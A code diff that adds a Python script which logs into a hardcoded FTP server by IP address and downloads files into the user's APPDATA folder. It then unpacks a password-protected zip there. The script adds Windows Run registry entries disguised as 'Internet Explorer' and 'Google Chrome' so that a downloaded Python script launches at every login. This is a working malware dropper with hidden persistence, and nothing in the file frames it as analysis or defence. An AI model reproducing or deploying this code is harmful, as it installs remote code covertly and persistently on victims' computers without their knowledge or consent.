@@ -1,0 +1,95 @@
+import os
+from ftplib import FTP
+from ftplib import error_perm
+from os import getenv
+from winreg import *
+import os.path
+import shutil
+import zipfile
+import glob
+import webbrowser
+
+host = "188.120.227.9"
+user = "PK1"
+password = "PK1"
+
+dir_name = "PY"
+
+path = os.path.abspath(getenv("APPDATA"))
+
+
+
+def walk(dir_, path_):
+    path__ = path_ + "\\" + f"{dir_}"
+    try:
+        os.remove(path__)
+        os.mkdir(path__)
+    except:
+        pass
+    ftp.cwd(str(dir_))
+    list_dir = ftp.nlst()
+    for i in list_dir:
+        try:
+            with open(f"{path__}\\{i}", "wb") as file:
+                ftp.retrbinary(f"RETR {i}", file.write)
+            print(f"файл {i} скопирован")
+        except error_perm:
+            walk(i, path__)
+
+    ftp.cwd("../")
+
+
+with FTP(host, timeout=120) as ftp:
+
+    ftp.login(user=user, passwd=password)
+    # print(ftp.getwelcome())
+    ftp.cwd(dir_name)
+    file_list = ftp.nlst()
+    # print(file_list)
+
+    try:
+        print(path)
+        os.mkdir(path)
+
+    except:
+        pass
+    
+    for file_name in file_list:
+        try:
+            with open(f"{path}\\{file_name}", "wb") as file:
+                ftp.retrbinary(f"RETR {file_name}", file.write)
+
+            print(f"файл {file_name} скопирован")
+        except error_perm:
+            walk(file_name, path)
+
+    try:
+        z = glob.glob(path + "\\*.zip")[0].split("\\")[-1]
+        zip = zipfile.ZipFile(path + "\\" + z, "r")
+
+        zip.setpassword("159753".encode('utf-8'))
+
+        zip.extractall(path)
+        zip.close()
+        
+        os.remove(path + "\\" + z)
+
+
+    except:
+        print("Ошибка zip файла")
+
+    ftp.quit()
+path = os.getenv('APPDATA')
+address=os.path.join(path, 'pythonw.exe') 
+address2=os.path.join(path, '1880.py')
+address3=' '.join([address, address2])
+key_my = OpenKey(HKEY_CURRENT_USER, 
+                 r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 
+                 0, KEY_ALL_ACCESS)
+SetValueEx(key_my, 'Internet Explorer', 0, REG_SZ, address3,)
+SetValueEx(key_my, 'Google Chrome', 0, REG_SZ, address3,)
+CloseKey(key_my)
+
+
+
+
